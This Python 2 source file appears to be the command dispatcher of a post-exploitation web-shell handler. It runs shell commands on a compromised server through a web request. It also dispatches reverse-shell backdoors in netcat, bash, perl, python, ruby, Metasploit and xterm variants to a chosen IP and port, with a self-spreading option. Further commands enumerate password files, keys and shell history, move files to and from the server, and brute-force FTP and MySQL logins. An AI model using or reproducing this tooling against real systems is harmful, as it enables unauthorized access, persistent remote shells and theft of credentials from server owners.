from os import getcwd, makedirs, path
from subprocess import Popen, call
from urllib import unquote

from modules.info import info
from modules.enumerate import enumerate
from modules.file_handler import file_handler
from modules.backdoor import backdoor
from modules.bruters.bruter import brute

from core.libs.banner import banner
from core.libs.request_handler import make_request
from core.libs.environment import complete
from core.libs.update import update
from core.libs.thirdparty.termcolor import colored, cprint


class Commander(object):
    '''
    Class to execute commands on the target
    '''
    def __init__(self):
        self.commands = {
            '@history': self.history,
            '@info': self.info,
            '@update': self.update,
            '@banner': self.banner,
            '@backdoor': self.backdoor,
            '@enum': self.enum,
            '@download': self.download,
            '@upload': self.upload,
            '@brute': self.brute,
        }

        self.history = []  # Command history

    def BackConnect(self):
        print info.get_information()    # printing information banner
        self.cwd = info.cwd
        complete.tab()      # calling auto-complete method
        cmdcount = 1
        while True:
            try:
                try:
                    # Getting command to be executed from the user
                    command = raw_input(info.current_user +
                            colored('@', 'red') +
                            colored(info.host_ip.split(',')[0], 'green') + ':~' +
                            colored('({0})'.format(self.cwd), 'yellow') + ':$ ').strip()
                # If something went wrong screw the list
                except IndexError:
                    command = raw_input('WebHandler@server:$ ').strip()

                command_list = command.split()

                # Updating command history
                self.history.append(unquote(command))

                if command not in ('exit', 'quit', 'bye'):
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command and command[0] == '!':
                        self.execute(command)
                    # Execute a module
                    elif command and command[0] == '@':
                        try:
                            self.commands[command_list[0]](command_list)
                        except KeyError:
                            cprint('[+] {0} module does not exist!'.format(command_list[0]), 'red')
                    else:
                        try:
                            #Handle the current working directory 'cwd'
                            if command_list[0] == 'cd' and len(command_list) > 1:
                                cwd = self.cwd
                                if '../' in command_list[-1] or '..' in command_list[-1]:
                                    self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
                                else:
                                    if command_list[-1].startswith('/'):
                                        cmd = '[ -d {0} ] && echo is_valid'.format(command_list[-1])
                                        if make_request.get_page_source(cmd)[0] == 'is_valid':
                                            self.cwd = command_list[-1]
                                        else:
                                            print 'bash: cd: {0}: No such file or directory'.format(command_list[-1])
                                    else:
                                        cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command_list[-1])
                                        if make_request.get_page_source(cmd)[0] == 'is_valid':
                                            self.cwd = '{0}/{1}'.format(cwd, command_list[-1])
                                        else:
                                            print 'bash: cd: {0}: No such file or directory'.format(command_list[-1])

                            elif command_list[0] == 'cd' and len(command) == 1:
                                self.cwd = info.cwd  # dirty patch to get the original cwd

                            else:
                                # Setting aliases for some commands to avoid
                                # Issues realted to empty directories
                                command = command.replace('ll', 'ls -lha') if command_list[0] == 'll' else command
                                command = command.replace('rm', 'rm -v') if command_list[0] == 'rm' else command
                                command = command.replace('cp', 'cp -v') if command_list[0] == 'cp' else command
                                command = command.replace('ifconfig', '/sbin/ifconfig')

                                # Get the source code cotenets
                                cmd = 'cd {0};{1}'.format(self.cwd, command)
                                source = make_request.get_page_source(cmd)
                                if source:
                                    for line in source:
                                        print line

                                # If the executed command doesn't exist
                                else:
                                    errmsg = '{0}: command not found '.format(unquote(command))
                                    errmsg += 'or I don\'t have permission to execute it'
                                    if command_list[0] == 'echo':
                                        pass
                                    else:
                                        cprint(errmsg, 'red')
                        except IndexError:
                            pass
                # Exit WebHandler if user provides exit as a command
                else:
                    #on_exit = '\n[+] Preformed "{0}" commands on the server, {1}'.format(cmdcount, info.host_ip.split(',')[0])
                    on_exit = '\n[*] Connection closed'
                    cprint(on_exit, 'red')
                    break

            # If recieved a break (^c)... Do nothing!
            except KeyboardInterrupt:
                print ""
            cmdcount += 1

    def execute(self, command):
        call(command[1:], shell=True)

    def history(self, command):
        x = 1
        for command in self.history:
            print '{0:2d}.) {1}'.format(x, command)
            x += 1

    def info(self, command):
        print info.get_information()

    def update(self, command):
        update()

    def banner(self, command):
        print banner

    def brute(self, command):
        if len(command) == 2:
            if command[1] == 'ftp':
                brute.ftp()
            elif command[1] == 'mysql':
                brute.mysql()
            else:
                brute.help()
        else:
            brute.help()

    def backdoor(self, command):
        if len(command) == 3:
            try:
                ip = command[2].split(':')[0]
                port = command[2].split(':')[1]
            except:
                backdoor.list()
                ip = None
            if ip:
                #if command[1] == "bash" or command[1] == "sh":
                #    backdoor.bash(ip, port)
                #elif command[1] == "java":
                #    backdoor.java(ip, port)
                if command[1] in ("metasploit", "msf"):
                    backdoor.msf(ip, port)
                #elif command[1] == "metasploit-php" or command[1] == "msf-php":
                #    backdoor.msf_php(ip, port)
                elif command[1] in ("netcat", "nc"):
                    backdoor.netcat(ip, port)
                elif command[1] in ("bash", "sh"):
                    backdoor.bash(ip, port)
                elif command[1] in ("perl", "pl"):
                    backdoor.perl(ip, port)
                #elif command[1] == "php":
                #    backdoor.php(ip, port)
                elif command[1] == "php-cli":
                    backdoor.php_cli(ip, port)
                elif command[1] in ("python", "py"):
                    backdoor.python(ip, port)
                elif command[1] in ("ruby", "rb"):
                    backdoor.ruby(ip, port)
                elif command[1] == "xterm":
                    backdoor.xterm(ip, port)
                elif command[1] == "testall":
                    backdoor.testall(ip, port)
                else:
                    backdoor.list()
            else:
                print 'Invalid IP address or port'
        elif len(command) == 2:
            if command[1] in ("spread", "self"):
                backdoor.spread()
            elif command[1] == "php":
                backdoor.php(info.host_ip.split(',')[0], info.local_ip)
            else:
                backdoor.list()
        else:
            backdoor.list()

    def enum(self, command):
        if len(command) == 2:
            if command[1] in ("group", "groups"):
                enumerate.group()
            elif command[1] == "history":
                enumerate.history()
            elif command[1] == "keys":
                enumerate.keys()
            elif command[1] in ("network", "ip"):
                enumerate.ip()
            elif command[1] == "os":
                enumerate.os()
            elif command[1] in ("passwd", "users"):
                enumerate.passwd()
            elif command[1] == "system":
                enumerate.system()
            elif command[1] == "writable":
                enumerate.writable()
            else:
                enumerate.list()
        else:
            enumerate.list()

    def download(self, command):
        if len(command) not in (2, 3):
            cprint('\[!] Usage: @download [remote_file_path] <local_file_path>', 'red')
        else:
            rfile_path = command[1]
            if len(command) == 2:
                lfile_path = '{0}/output/{1}{2}_{3}'.format(getcwd(), info.host_ip, rfile_path, info.session)
                lfolder = '/'.join(lfile_path.split('/')[:-1])
                if not path.exists(lfolder):
                    makedirs(lfolder)
            else:
                lfile_path = command[2]
            file_handler.download_file(rfile_path, lfile_path)

    def upload(self, command):
        if len(command) != 3:
            cprint('\n[!] Usage: @upload [local_file_path] [remote_file_path]', 'red')
        else:
            lfile_path = command[1]
            rfile_path = command[2]
            file_handler.upload_file(lfile_path, rfile_path)

# Taking an instance from the main class
commander = Commander()
